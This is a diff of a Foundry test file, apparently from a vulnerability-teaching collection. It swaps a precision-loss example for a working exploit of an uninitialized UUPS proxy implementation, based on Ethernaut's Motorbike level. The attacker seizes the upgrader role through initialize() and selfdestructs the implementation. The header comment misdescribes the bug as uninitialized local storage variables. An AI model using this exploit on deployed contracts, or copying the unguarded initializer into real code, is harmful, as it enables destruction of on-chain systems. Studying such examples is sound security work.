@@ -2,72 +2,189 @@
 pragma solidity ^0.8.18;
 
 import "forge-std/Test.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/proxy/utils/Initializable.sol";
 
 /*
-Name: Precision Loss - rounding down to zero
+Name: Uninitialized variable Vulnerability
 
 Description:
-Support all the ERC20 tokens, as those tokens may have different decimal places. 
-For example, USDT and USDC have 6 decimals. So, in the calculations, one must be careful.
-
-Mitigation:  
-Avoid any situation that if the numerator is smaller than the denominator, the result will be zero.
-Rounding down related issues can be avoided in many ways:
-    1.Using libraries for rounding up/down as expected
-    2.Requiring result is not zero or denominator is <= numerator
-    3.Refactor operations for avoiding first dividing then multiplying, when first dividing then multiplying, precision lost is amplified
-
+Uninitialized local storage variables may contain the value of other storage variables in the contract; 
+this fact can cause unintentional vulnerabilities, or be exploited deliberately.
 
 REF:
-https://twitter.com/1nf0s3cpt/status/1675805135061286914
-https://github.com/sherlock-audit/2023-02-surge-judging/issues/244
-https://github.com/sherlock-audit/2023-02-surge-judging/issues/122
-https://dacian.me/precision-loss-errors#heading-rounding-down-to-zero
+https://blog.dixitaditya.com/ethernaut-level-25-motorbike
 */
 
 contract ContractTest is Test {
-    SimplePool SimplePoolContract;
+    Engine EngineContract;
+    Motorbike MotorbikeContract;
+    Attack AttackContract;
 
-    function setUp() public {
-        SimplePoolContract = new SimplePool();
+    function testUninitialized() public {
+        EngineContract = new Engine();
+        MotorbikeContract = new Motorbike(address(EngineContract));
+        AttackContract = new Attack();
+
+        // Engine contract is not initialized
+        console.log("Unintialized Upgrader:", EngineContract.upgrader());
+        // Malicious user calls initialize() on Engine contract to become upgrader.
+        address(EngineContract).call(abi.encodeWithSignature("initialize()"));
+        // Malicious user becomes the upgrader
+        console.log("Initialized Upgrader:", EngineContract.upgrader());
+
+        // Upgrade the implementation of the proxy to a malicious contract and call `attack()`
+        bytes memory initEncoded = abi.encodeWithSignature("attack()");
+        address(EngineContract).call(
+            abi.encodeWithSignature(
+                "upgradeToAndCall(address,bytes)",
+                address(AttackContract),
+                initEncoded
+            )
+        );
+
+        console.log("Exploit completed");
+        console.log("Since EngineContract destroyed, next call will fail.");
+        address(EngineContract).call(
+            abi.encodeWithSignature(
+                "upgradeToAndCall(address,bytes)",
+                address(AttackContract),
+                initEncoded
+            )
+        );
     }
-
-    function testRounding_error() public view {
-        SimplePoolContract.getCurrentReward();
-    }
-
-    receive() external payable {}
 }
 
-contract SimplePool {
-    uint public totalDebt;
-    uint public lastAccrueInterestTime;
-    uint public loanTokenBalance;
+contract Motorbike {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT =
+        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 
-    constructor() {
-        totalDebt = 10000e6; //debt token is USDC and has 6 digit decimals.
-        lastAccrueInterestTime = block.timestamp - 1;
-        loanTokenBalance = 500e18;
+    struct AddressSlot {
+        address value;
     }
 
-    function getCurrentReward() public view returns (uint _reward) {
-        // Get the time passed since the last interest accrual
-        uint _timeDelta = block.timestamp - lastAccrueInterestTime; //_timeDelta=1
+    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
+    constructor(address _logic) {
+        require(
+            Address.isContract(_logic),
+            "ERC1967: new implementation is not a contract"
+        );
+        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
+        (bool success, ) = _logic.delegatecall(
+            abi.encodeWithSignature("initialize()")
+        );
+        require(success, "Call failed");
+    }
 
-        // If the time passed is 0, return 0 reward
-        if (_timeDelta == 0) return 0;
+    // Delegates the current call to `implementation`.
+    function _delegate(address implementation) internal virtual {
+        // solhint-disable-next-line no-inline-assembly
+        assembly {
+            calldatacopy(0, 0, calldatasize())
+            let result := delegatecall(
+                gas(),
+                implementation,
+                0,
+                calldatasize(),
+                0,
+                0
+            )
+            returndatacopy(0, 0, returndatasize())
+            switch result
+            case 0 {
+                revert(0, returndatasize())
+            }
+            default {
+                return(0, returndatasize())
+            }
+        }
+    }
 
-        // Calculate the supplied value
-        // uint _supplied = totalDebt + loanTokenBalance;
-        //console.log(_supplied);
-        // Calculate the reward
-        _reward = (totalDebt * _timeDelta) / (365 days * 1e18);
-        console.log("Current reward", _reward);
+    // Fallback function that delegates calls to the address returned by `_implementation()`.
+    // Will run if no other function in the contract matches the call data
+    fallback() external payable virtual {
+        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
+    }
 
-        // 31536000 is the number of seconds in a year
-        // 365 days * 1e18 = 31_536_000_000_000_000_000_000_000
-        //_totalDebt * _timeDelta / 31_536_000_000_000_000_000_000_000
-        // 10_000_000_000 * 1 / 31_536_000_000_000_000_000_000_000 // -> 0
-        _reward;
+    // Returns an `AddressSlot` with member `value` located at `slot`.
+    function _getAddressSlot(
+        bytes32 slot
+    ) internal pure returns (AddressSlot storage r) {
+        assembly {
+            r.slot := slot
+        }
+    }
+}
+
+contract Engine is Initializable {
+    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+    bytes32 internal constant _IMPLEMENTATION_SLOT =
+        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    address public upgrader;
+    uint256 public horsePower;
+
+    struct AddressSlot {
+        address value;
+    }
+
+    function initialize() external initializer {
+        horsePower = 1000;
+        upgrader = msg.sender;
+    }
+
+    // Upgrade the implementation of the proxy to `newImplementation`
+    // subsequently execute the function call
+    function upgradeToAndCall(
+        address newImplementation,
+        bytes memory data
+    ) external payable {
+        _authorizeUpgrade();
+        _upgradeToAndCall(newImplementation, data);
+    }
+
+    // Restrict to upgrader role
+    function _authorizeUpgrade() internal view {
+        require(msg.sender == upgrader, "Can't upgrade");
+    }
+
+    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
+    function _upgradeToAndCall(
+        address newImplementation,
+        bytes memory data
+    ) internal {
+        // Initial upgrade and setup call
+        _setImplementation(newImplementation);
+        if (data.length > 0) {
+            (bool success, ) = newImplementation.delegatecall(data);
+            require(success, "Call failed");
+        }
+    }
+
+    event Returny(uint256);
+
+    function greetMe() public {
+        emit Returny(0x42);
+    }
+
+    // Stores a new address in the EIP1967 implementation slot.
+    function _setImplementation(address newImplementation) private {
+        require(
+            Address.isContract(newImplementation),
+            "ERC1967: new implementation is not a contract"
+        );
+
+        AddressSlot storage r;
+        assembly {
+            r.slot := _IMPLEMENTATION_SLOT
+        }
+        r.value = newImplementation;
+    }
+}
+
+contract Attack {
+    function attack() external {
+        selfdestruct(payable(msg.sender));
     }
 }
